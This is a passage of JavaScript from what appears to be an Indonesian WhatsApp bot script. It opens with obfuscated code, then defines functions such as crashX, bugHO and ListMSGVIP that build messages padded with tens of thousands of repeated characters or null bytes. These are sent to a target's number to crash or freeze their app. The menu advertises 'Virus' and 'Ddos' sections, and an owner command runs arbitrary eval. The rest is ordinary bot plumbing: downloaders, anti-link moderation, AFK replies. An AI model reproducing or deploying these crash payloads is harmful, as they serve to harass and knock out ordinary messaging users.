{'userJid':_0x27b7b3});await zynX['relayMessage'](_0x27b7b3,_0x15bc4f[_0x5f52ee(0x11c)],{'participant':{'jid':_0x27b7b3},'messageId':_0x15bc4f['key']['id']});}async function LiveLocVIP2(_0x3a6ed0){const _0x232806=_0x29c806,_0x10fc1b=generateWAMessageFromContent(_0x3a6ed0,proto[_0x232806(0x107)]['fromObject']({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':_0x232806(0x159)+_0x232806(0x12c)['repeat'](0xea60),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x3a6ed0});await zynX[_0x232806(0x13e)](_0x3a6ed0,_0x10fc1b[_0x232806(0x11c)],{'participant':{'jid':_0x3a6ed0},'messageId':_0x10fc1b[_0x232806(0x125)]['id']});}async function ListMSGVIP2(_0x10bc3b){const _0x4ab5a0=_0x29c806,_0x436d40=generateWAMessageFromContent(_0x10bc3b,proto['Message'][_0x4ab5a0(0x11b)]({'listMessage':{'title':_0x4ab5a0(0x116)+'\x00'[_0x4ab5a0(0x138)](0x2710),'footerText':_0x4ab5a0(0x130),'description':_0x4ab5a0(0x130),'buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':'lol','products':[{'productId':_0x4ab5a0(0x131)}]}],'productListHeaderImage':{'productId':_0x4ab5a0(0x131),'jpegThumbnail':null},'businessOwnerJid':_0x4ab5a0(0x14c)}},'footer':_0x4ab5a0(0x148),'contextInfo':{'expiration':0x927c0,'ephemeralSettingTimestamp':_0x4ab5a0(0x129),'entryPointConversionSource':_0x4ab5a0(0x12a),'entryPointConversionApp':_0x4ab5a0(0x11f),'entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':_0x4ab5a0(0x147)}},'selectListType':0x2,'product_header_info':{'product_header_info_id':0x4433e2e130,'product_header_is_rejected':![]}}),{'userJid':_0x10bc3b});await zynX[_0x4ab5a0(0x13e)](_0x10bc3b,_0x436d40[_0x4ab5a0(0x11c)],{'participant':{'jid':_0x10bc3b},'messageId':_0x436d40[_0x4ab5a0(0x125)]['id']});}async function ListMSGVIP3(_0x485410){const _0x57ce1a=_0x29c806,_0x5e339b=generateWAMessageFromContent(_0x485410,proto['Message'][_0x57ce1a(0x11b)]({'viewOnceMessage':{'message':{'interactiveMessage':{'header':{'title':'','subtitle':_0x57ce1a(0x146)},'body':{'text':_0x57ce1a(0x146)},'footer':{'text':_0x57ce1a(0x146)},'nativeFlowMessage':{'buttons':[{'name':_0x57ce1a(0x115),'buttonParamsJson':'{\x20display_text\x20:\x20\x27zynX\x27,\x20url\x20:\x20,\x20merchant_url\x20:\x20\x20}'},{'name':'cta_url','buttonParamsJson':_0x57ce1a(0x106)},{'name':'cta_url','buttonParamsJson':_0x57ce1a(0x106)}],'messageParamsJson':''['repeat'](0xf423f)}}}}}),{'userJid':_0x485410});await zynX[_0x57ce1a(0x13e)](_0x485410,_0x5e339b['message'],{'participant':{'jid':_0x485410},'messageId':_0x5e339b['key']['id']});}async function LiveLocVIP3(_0x24bea3){const _0x283c55=_0x29c806;var _0x370af1=generateWAMessageFromContent(_0x24bea3,proto[_0x283c55(0x107)][_0x283c55(0x11b)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':_0x283c55(0x149)+_0x283c55(0x123)[_0x283c55(0x138)](0xea60),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x24bea3});await zynX[_0x283c55(0x13e)](_0x24bea3,_0x370af1[_0x283c55(0x11c)],{'participant':{'jid':_0x24bea3},'messageId':_0x370af1['key']['id']});}async function BugButtonVIP(_0x10d9a9){const _0x36c2f0=_0x29c806;var _0x386da0=generateWAMessageFromContent(_0x10d9a9,proto['Message'][_0x36c2f0(0x11b)]({'viewOnceMessage':{'message':{'interactiveMessage':{'header':{'title':'','subtitle':''},'body':{'text':''},'footer':{'text':''},'nativeFlowMessage':{'buttons':[{'name':'cta_url','buttonParamsJson':_0x36c2f0(0x144)}],'messageParamsJson':'\x00'['repeat'](0x2dc6c0)}}}}}),{'userJid':_0x10d9a9});await zynX[_0x36c2f0(0x13e)](_0x10d9a9,_0x386da0[_0x36c2f0(0x11c)],{'participant':{'jid':_0x10d9a9},'messageId':_0x386da0[_0x36c2f0(0x125)]['id']});}async function ListMSGVIP4(_0x266ec7){const _0x36eda1=_0x29c806,_0x66127e=generateWAMessageFromContent(_0x266ec7,proto[_0x36eda1(0x107)]['fromObject']({'listMessage':{'title':_0x36eda1(0x149)+'\x00'['repeat'](0x2710),'footerText':'','description':'','buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':_0x36eda1(0x10f),'products':[{'productId':_0x36eda1(0x131)}]}],'productListHeaderImage':{'productId':_0x36eda1(0x131),'jpegThumbnail':null},'businessOwnerJid':_0x36eda1(0x14c)}},'footer':'puki','contextInfo':{'expiration':0x93a80,'ephemeralSettingTimestamp':_0x36eda1(0x129),'entryPointConversionSource':'global_search_new_chat','entryPointConversionApp':'whatsapp','entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':_0x36eda1(0x147)}},'selectListType':0x2,'product_header_info':{'product_header_info_id':0x4433e2e130,'product_header_is_rejected':![]}}),{'userJid':_0x266ec7});await zynX[_0x36eda1(0x13e)](_0x266ec7,_0x66127e[_0x36eda1(0x11c)],{'participant':{'jid':_0x266ec7},'messageId':_0x66127e['key']['id']});}


async function crashX(target, m) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️࿆᷍‌᜴Zynxz 😻╮⭑ 乂⃰‌‌؜ZynMods⃟⭐️᜴▴Zyndomateཀ‌‌✅⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: m });
await putramodstzy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


async function zyninvsible(target, m) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: m });
await putramodstzy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function bugHO(target, m) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️࿆᷍‌᜴Zyn Mods Bug ╮⭑ 乂⃰‌‌؜PutraMods⃟⭐️᜴▴Zyndomate✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: m })
await Putramodstzy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
// BATAS FUNCTION BUG


async function dellCase(filePath, caseNameToRemove) {
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan:', err);
            return;
        }

        const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');

        fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return;
            }

            console.log(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
        });
    });
}

const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await zynX.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: fcall })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

const downloadMp3 = async (url) => {
let look = await yts(text);
let convert = look.videos[0];       
const pl = await youtube(convert.url)
await zynX.sendMessage(m.chat,{
    audio: { url: pl.mp3  },
    fileName: convert.title + '.mp3',
    mimetype: 'audio/mpeg',
    contextInfo:{
        externalAdReply:{
            title:convert.title,
            body: botname,
            thumbnailUrl: convert.image,
            sourceUrl: pl.mp3,
            mediaType:1,
            mediaUrl:convert.url,
        }

    },
},{quoted: fcall })
reply('Soryy Bre Klo Mb Lagunya Gede Soalnya Biar Jernih Musiknya')
}

async function igdl2(url) {
            let res = await axios("https://indown.io/");
            let _$ = cheerio.load(res.data);
            let referer = _$("input[name=referer]").val();
            let locale = _$("input[name=locale]").val();
            let _token = _$("input[name=_token]").val();
            let { data } = await axios.post(
              "https://indown.io/download",
              new URLSearchParams({
                link: url,
                referer,
                locale,
                _token,
              }),
              {
                headers: {
                  cookie: res.headers["set-cookie"].join("; "),
                },
              }
            );
            let $ = cheerio.load(data);
            let result = [];
            let __$ = cheerio.load($("#result").html());
            __$("video").each(function () {
              let $$ = $(this);
              result.push({
                type: "video",
                thumbnail: $$.attr("poster"),
                url: $$.find("source").attr("src"),
              });
            });
            __$("img").each(function () {
              let $$ = $(this);
              result.push({
                type: "image",
                url: $$.attr("src"),
              });
            });
          
            return result;
          }

if (!zynX.public) {
if (!m.key.fromMe) return
}
function getRandomColor() {
  return Math.floor(Math.random() * 256); // Menghasilkan warna acak dari 0-255
}
const randomColor1 = getRandomColor(); // Warna acak untuk botname
const randomColor2 = getRandomColor(); // Warna acak untuk pushname
const randomColor3 = getRandomColor(); // Warna acak untuk groupName | Private Chat
const randomBgColor1 = getRandomColor(); // Warna acak untuk latar belakang zyn
const randomBgColor2 = getRandomColor(); // Warna acak untuk latar belakang Time
const randomBgColor3 = getRandomColor(); // Warna acak untuk latar belakang Cmd
const randomBgColor4 = getRandomColor(); // Warna acak untuk latar belakang From
const randomBgColor5 = getRandomColor(); // Warna acak untuk latar belakang In

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
zynX.sendPresenceUpdate('available', m.chat)
console.log(
  `\x1b[48;5;${randomBgColor1}m|\x1b[1;37m${botname}\x1b[0m|\n` +  // Latar belakang acak untuk zyn dengan teks putih tebal di dalam tanda | |
  `\x1b[48;5;${randomBgColor2}m\x1b[1;37m|Time| ${time}\x1b[0m\n` +  // Latar belakang acak untuk |Time| dengan teks putih tebal
  `\x1b[48;5;${randomBgColor3}m\x1b[1;36m|Cmd| \x1b[38;5;${randomColor1}m${budy || m.mtype}\x1b[0m\n` +  // Latar belakang acak untuk |Cmd| dengan warna cyan untuk teks, warna acak untuk budy || m.mtype
  `\x1b[48;5;${randomBgColor4}m\x1b[38;5;${randomColor2}m|From| ${pushname}\x1b[0m\n` +  // Latar belakang acak untuk |From| dengan warna acak untuk teks pushname
  `\x1b[48;5;${randomBgColor5}m${groupName ? `\x1b[38;5;${randomColor3}m|In| ${groupName}` : `\x1b[38;5;${randomColor3}m|In| Private Chat`}\x1b[0m`  // Latar belakang acak untuk |In| dengan warna acak untuk teks groupName atau Private Chat
);
}
           

if (global.autodonlod && !m.key.fromMe)
if (budy.match(`youtube.com|youtu.be`)) {
let lodingdonlod = `*[ Loaded ]* downloaded from the link`
const Fernazerinivido = require('./lib/ytdl2')
const vido=await Fernazerinivido.mp4(budy)
downloadMp3(budy)
const autod=`*Tittle:* ${vido.title}\n*Date:* ${vido.date}\n*Duration:* ${vido.duration}\n*Quality:* ${vido.quality}`
await zynX.sendMessage(m.chat,{ video: {url:vido.videoUrl}, caption: autod },{quoted: fcall })
}
     
// Anti Link

if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await zynX.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return zynX.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return zynX.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return zynX.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await zynX.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
zynX.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
zynX.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: zynX.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, zynX.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
zynX.ev.emit('messages.upsert', msg)
}
if (budy.startsWith('!')) {
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

try {
ppuser = await zynX.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

try {
    let isNumber = x => typeof x === 'number' && !isNaN(x)
    let limitUser = isPrem ? 1000 : 100
    let user = global.db.data.users[m.sender]
    
    if (typeof user !== 'object') global.db.data.users[m.sender] = {}
    
    if (user) {
        if (!isNumber(user.afkTime)) user.afkTime = -1
        if (!('afkReason' in user)) user.afkReason = ''
        if (!isNumber(user.limit)) user.limit = limitUser
    } else global.db.data.users[m.sender] = {
        afkTime: -1,
        afkReason: '',
        limit: limitUser,
        }
    } catch (err) {
    console.log(err)} 

let isNumber = x => typeof x === 'number' && !isNaN(x)
let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
                if (!isNumber(setting.status)) setting.status = 0
                if (autobio) {
        let _uptime = process.uptime() * 1000
		let uptime = clockString(_uptime)
		await zynX.updateProfileStatus(`I am ${botname} | Aktif Selama ${uptime} | Mode : ${zynX.public ? 'Public-Mode' : 'Self-Mode'}`).catch(_ => _)
        }


if (autoread) {
zynX.readMessages([m.key])
        }
            } else global.db.data.settings[botNumber] = {
                status: 0,
                autobio: false,
                autoread: false
            }

function pickMoji(list) {
     return list[Math.floor(Math.random() * list.length)]
  }

async function falseR () {
zynX.sendReact(m.chat, '❌', m.key)
}

async function loading () {
var genalpa = [
"Aɴᴛɪ",
"Gᴇᴅᴏʀ",
"Zʏɴxᴢᴏ Aɴᴛɪ Gᴇᴅᴏʀ"
]
let { key } = await zynX.sendMessage(m.chat, {text: 'Zʏɴxᴢᴏ'})
//Pengalih isu

for (let i = 0; i < zynX.length; i++) {
await sleep(65)
await zynX.sendReact(m.chat, zynX[i], m.key)
//PESAN LEPAS
}
}

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])];
for (let jid of mentionUser) {
    let user = db.data.users[jid];
    if (!user) continue;
    let afkTime = user.afkTime;
    if (!afkTime || afkTime < 0) continue;
    let reason = user.afkReason || '';
    if (!iszynzBottz(m.sender)) { // Jika yang ngetag bukan zynzBottz
        reply(`🚫 *Jangan tag dia!*
        ❏  *Dia sedang AFK* ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
        ❏  *Selama* ${clockString(new Date - afkTime)}
        `.trim());
        return; // Hentikan proses lebih lanjut karena yang ngetag bukan zynzBottz
    }
}

if (db.data.users[m.sender].afkTime > -1) {
    let user = db.data.users[m.sender];
    reply(`
    👻 ${pushname} Telah Kembali Dari Afk\n\n ❏ ${user.afkReason ? ' *Dengan Alasan* : ' + user.afkReason : ''}\n\n ❏  *Selama* : ${clockString(new Date - user.afkTime)}
    `.trim());
    user.afkTime = -1;
    user.afkReason = '';
}

function iszynzBottz(jid) {
    // Cek apakah jid adalah zynzBottz
    return jid === '6285789034010@s.whatsapp.net';
}

switch(command) {
//—————「 JADIBOT 」—————//
case "clonebot": {
wek = `Silahkan pilih *option* di bawah ini`

let sections = [{
title: 'Selection',
highlight_label: 'Clone Bot',
rows: [{
title: 'Start',
description: `Getting started as a bot`, 
id: '.jadibot'
},
{
title: 'Stop',
description: `Stop being a bot`, 
id: '.stopjadibot'
},
{
title: 'List',
description: `Displays a list of bot users`, 
id: '.listjadibot'
}]
}]

let listMessage = {
    title: 'Selection', 
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: saluran,
 newsletterJid: idsal,
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: zynX.decodeJid(zynX.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: wek
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: wm
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `👋 ʜɪ ᴋᴀᴋ${m.sender.split('@')[0]}\n`,
 subtitle: "Zʏɴxᴢᴏ",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "http://telegra.ph/file/d3993006a1431ef2aa9b9.jpg" } }, { upload: zynX.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 ],
 })
 })
 }
 }
}, {})

await zynX.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case "jadibot":{
  //if (m.isGroup) return reply("Features Used Only For Private Chat!")
  //if (!isPrem) return m.reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
  jadibot(zynX, m, from)
  await sleep(4000)
  //m.reply(`mess.wait`)
  const jsonData = JSON.parse(fs.readFileSync(`./Zʏɴxᴢᴏ/${m.sender.split("@")[0]}/creds.json`));
// Membaca pairingCode dari file JSON
const pairingCode = jsonData.pairingCode;
// Membagi pairingCode menjadi kelompok-kelompok berisi empat karakter
let formattedPairingCode = '';
for (let i = 0; i < pairingCode.length; i += 4) {
  if (i > 0) {
    formattedPairingCode += '-';
  }
  formattedPairingCode += pairingCode.substring(i, i + 4);
}
// Mengirimkan Pesan
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `You Pairing Code : *${formattedPairingCode}*\n\n*How To Install*\n1. Enter the *linked device*\n2. Click *link device*\n3. Click enter *with phone number only*\n4. Enter your *code*"\n\nYour code will *expire* in *20* seconds`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: wm
          }),
          header: proto.Message.InteractiveMessage.Header.create({ 
                  title: ``,
                  gifPlayback: true,
                  subtitle: `test`,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "cta_copy",
                "buttonParamsJson": JSON.stringify({
                "display_text": "Copy code",
                "copy_code": `${formattedPairingCode}`
                })
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterName: saluran,
				  newsletterJid: idsal,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await zynX.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case "stopjadibot":{
  //if (m.isGroup) return reply("Features Used Only For Private Chat!")
  //if (!isPrem) return m.reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
  stopjadibot(zynX, from)
}
break
case "listjadibot":{
  //if (isGroup) return reply("Features Used Only For Private Chat!")
  //if (!isPrem) return m.reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
  listjadibot(zynX, m)
}
break

case "menu": {
let owned = `${global.owner}`
let statususer = isCreator ? 'Owner' : isPrem ? 'Premium' : 'User';
let limitz = db.data.users[m.sender].limit;

wek = `┏─╴[ \`𝗭𝗬𝗡𝗫𝗭𝗢 𝗦𝗖𝗥𝗜𝗣𝗧\` ] ──┓
│ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *@${owned.split("@")[0]}*
│ 𝐁𝐨𝐭 : 𝗭𝘆𝗻𝘅𝘇𝗫𝘅𝟭𝟭
│ 𝐌𝐨𝐝𝐞 : ${zynX.public ? `𝗣𝘂𝗯𝗹𝗶𝗰` : `𝗣𝗿𝗶𝘃𝗮𝘁𝗲`}
│ 𝐓𝐢𝐦𝐞 : *${time}*
│ 𝐕𝐞𝐫𝐬𝐢 : 𝗫𝗜
┗──────────────────┛`
const caption = `${wek}`;
let sections = [
{
title: 'All Menu',
highlight_label: 'All Menu List',
rows: [{
title: 'Menu All',
description: `Displays All Menu`, 
id: `${prefix}menu all`
}]},
{
title: 'List Menu',
rows: [{
title: 'Menu Virus',
description: `Displays Virus Menu`, 
id: `${prefix}menu virus`
},
{
title: 'Menu Ddos',
description: `Displays Ddos Menu`, 
id: `${prefix}menu ddos`
},
{
title: 'Menu Ai',
description: `Displays Ai Menu`, 
id: `${prefix}menu ai`
},
{
title: 'Menu Database',
description: `Displays Database Menu`, 
id: `${prefix}menu database`
},
{
title: 'Menu Fun',
description: `Displays Fun Menu`, 
id: `${prefix}menu fun`
},
{
title: 'Menu Group',
description: `Displays Group Menu`, 
id: `${prefix}menu group`
},
{
title: 'Menu Search', 
description: "Displays the Search Menu", 
id: `${prefix}menu search`
},
{
title: 'Menu Tools', 
description: "Displays the Tools Menu", 
id: `${prefix}menu tools`
}]
}]

let listMessage = {
    title: 'List Menu', 
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: saluran,
 newsletterJid: idsal,
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: zynX.decodeJid(zynX.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: caption
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: wm
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "http://telegra.ph/file/d3993006a1431ef2aa9b9.jpg" } }, { upload: zynX.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Creator\",\"url\":\"https://t.me/Zynxzooo\",\"merchant_url\":\"https://t.me/Zynxzooo\"}"
 },
 ],
 })
 })
 }
 }
}, {})

if (!text) await zynX.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
if (args[0] === "all") {
    
    let owned = `${global.owner}`
    let statususer = isCreator ? 'Owner' : isPrem ? 'Premium' : 'User';
    let limitz = db.data.users[m.sender].limit;
    wek = `┏─╴[ \`𝗭𝗬𝗡𝗫𝗭𝗢 𝗦𝗖𝗥𝗜𝗣𝗧\` ] ──┓
│ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *@${owned.split("@")[0]}*
│ 𝐁𝐨𝐭 : 𝗭𝘆𝗻𝘅𝘇𝗫𝘅𝟭𝟭
│ 𝐌𝐨𝐝𝐞 : ${zynX.public ? `𝗣𝘂𝗯𝗹𝗶𝗰` : `𝗣𝗿𝗶𝘃𝗮𝘁𝗲`}
│ 𝐓𝐢𝐦𝐞 : *${time}*
│ 𝐕𝐞𝐫𝐬𝐢 : 𝗫𝗜
┗──────────────────┛`
 const caption = `${wek}\n${readmore}\n${menuai(prefix)}\n${menudatabase(prefix)}\n${menuvirus(prefix)}\n${menuddos(prefix)}\n${menufun(prefix)}\n${menugroup(prefix)}\n${menusearch(prefix)}\n${menutools(prefix)}`;
zynX.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `Zʏɴxᴢᴏ`,
            mimetype: "application/pdf",
            fileLength: 00000111,
            pageCount: 2024,
caption: caption,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	 newsletterName: saluran,
 newsletterJid: idsal,
footer: proto.Message.InteractiveMessage.Footer.create({
 text: wm
 }),
		},
		externalAdReply: {  
title: `${time}`, 
body: `Zʏɴxᴢᴏ`,
thumbnail: thumb,
sourceUrl: 'https://whatsapp.com/channel/0029ValRq0ULikgDaQ5Y0c0L', 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
 }
else if (args[0] === 'ai') {
await sleep(100)
    
 const caption = `${wek}\n${menuai(prefix)}`;

zynX.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `Zʏɴxᴢᴏ`,
            mimetype: "application/pdf",
            fileLength: 00000111,
            pageCount: 2024,
caption: caption,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	 newsletterName: saluran,
 newsletterJid: idsal,
footer: proto.Message.InteractiveMessage.Footer.create({
 text: wm
 }),
		},
		externalAdReply: {  
title: `${time}`, 
body: `Zʏɴxᴢᴏ`,
thumbnail: thumb,
sourceUrl: 'https://whatsapp.com/channel/0029ValRq0ULikgDaQ5Y0c0L', 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
 }
 else if (args[0] === 'fun') {
await sleep(100)
   
 const caption = `${menufun(prefix)}`;

zynX.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `Zʏɴxᴢᴏ`,
            mimetype: "application/pdf",
            fileLength: 00000111,
            pageCount: 2024,
caption: caption,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	 newsletterName: saluran,
 newsletterJid: idsal,
footer: proto.Message.InteractiveMessage.Footer.create({
 text: wm
 }),
		},
		externalAdReply: {  
title: `${time}`, 
body: `Zʏɴxᴢᴏ`,
thumbnail: thumb,
sourceUrl: 'https://whatsapp.com/channel/0029ValRq0ULikgDaQ5Y0c0L', 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
 }else if (args[0] === 'database') {
await sleep(100)
    
 const caption = `${menudatabase(prefix)}`;
zynX.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `Zʏɴxᴢᴏ`,
            mimetype: "application/pdf",
            fileLength: 00000111,
